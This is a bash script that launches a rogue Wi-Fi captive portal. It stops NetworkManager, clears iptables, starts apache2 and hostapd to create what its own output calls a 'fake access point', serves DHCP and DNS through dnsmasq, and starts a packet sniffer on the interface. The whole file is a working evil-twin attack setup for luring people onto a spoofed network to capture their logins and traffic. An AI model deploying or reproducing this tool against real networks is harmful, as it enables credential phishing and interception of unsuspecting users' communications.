#!/usr/bin/env bash

clear
echo "||||-----CAPTIVE PORTAL MODE-----||||"
echo "Stopping the Network Manager"
service NetworkManager stop

echo ".....Allowing packet forwarding and cleaning iptables rules....."
bash /opt/captive_portal/flushiptables.sh

echo ".....Changing AP name in hostapd Config file....."
python ap_name_changer.py

echo ".....Starting web server through apache2....."
expect /opt/captive_portal/apache2_auto_login.exp
sleep 1

echo ".....Creating the fake access point through hostapd....."
xterm -e 'hostapd /opt/captive_portal/hostapd.conf' &
sleep 5

echo ".....Assigning the gateway ip to wireless interface....."
ifconfig eth0 192.168.100.1 netmask 255.255.255.0
sleep 1
echo "Ip assigned : $(ifconfig eth0 | grep inet -w)"

echo ".....Starting dhcp and dns server through dnsmasq....."
xterm -e 'dnsmasq -d -C /opt/captive_portal/dnsmasq.conf' &
sleep 1

echo ".....Starting the Sniffer.....0_0"
xterm -e 'python sniff_packet.py -i eth0' &

echo "Type quit to exit"

while true; do
	read input
	if [ $input == "quit" ]; then
		killall hostapd
		killall dnsmasq
		service NetworkManager restart
		service apache2 stop
		echo "Captive Portal successfully Stopped...[+]"
		break
	else
		echo "enter a valid option"
		continue
	fi
done
 
